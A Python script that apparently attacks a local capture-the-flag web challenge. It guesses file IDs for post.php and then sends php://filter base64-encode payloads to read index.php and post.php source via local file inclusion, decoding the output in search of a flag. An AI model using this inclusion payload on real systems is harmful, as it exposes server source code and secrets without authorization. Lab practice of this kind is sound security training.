import requests
import re

base_url = "http://127.0.0.1:32891"

print("[+] Testing the hint as a direct file ID...")

# Try the hint text itself as file IDs
test_ids = [
    "{I'm_a_Script_Kiddie}",
    "I'm_a_Script_Kiddie",
    "Im_a_Script_Kiddie",
    "I_m_a_Script_Kiddie",
    "uploads/{I'm_a_Script_Kiddie}",
    "uploads/I'm_a_Script_Kiddie",
    "uploads/Im_a_Script_Kiddie",
]

for file_id in test_ids:
    resp = requests.get(f"{base_url}/post.php", params={'id': file_id})
    if len(resp.text) > 100 and "Post not found" not in resp.text:
        print(f"\n[!] Found: {file_id}")
        print(f"Length: {len(resp.text)}")
        if "FLAG{" in resp.text:
            print("[!!!] FLAG FOUND!")
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            print(f"Flags: {flags}")
            print("\nFull response:")
            print(resp.text)
            break
        elif len(resp.text) < 500:
            print(f"Preview: {resp.text}")
    else:
        print(f"Not found: {file_id}")

# Maybe the hint is telling us to look at the source code of PHP files?
print("\n\n[+] Trying to read PHP source via LFI with php:// wrappers...")
php_files = ['index.php', 'post.php']

for php_file in php_files:
    # Try php://filter to read source
    lfi_payload = f"php://filter/convert.base64-encode/resource={php_file}"
    resp = requests.get(f"{base_url}/post.php", params={'id': lfi_payload})
    
    if "Post not found" not in resp.text and "traversal" not in resp.text and len(resp.text) > 100:
        print(f"\n[!] Successfully read {php_file} source!")
        print(f"Response length: {len(resp.text)}")
        
        # Try to extract base64 encoded content
        # Look for large base64 blocks
        import base64
        b64_blocks = re.findall(r'[A-Za-z0-9+/]{100,}={0,2}', resp.text)
        if b64_blocks:
            print(f"[+] Found {len(b64_blocks)} potential base64 blocks")
            for block in b64_blocks[:1]:  # Decode first block
                try:
                    decoded = base64.b64decode(block).decode('utf-8', errors='ignore')
                    print(f"\n[+] Decoded source ({len(decoded)} chars):")
                    print(decoded[:1000])  # Show first 1000 chars
                    
                    if 'FLAG{' in decoded:
                        print("\n[!!!] FLAG IN SOURCE CODE!")
                        flags = re.findall(r'FLAG\{[^}]+\}', decoded)
                        print(f"Flags: {flags}")
                except Exception as e:
                    print(f"Decode error: {e}")

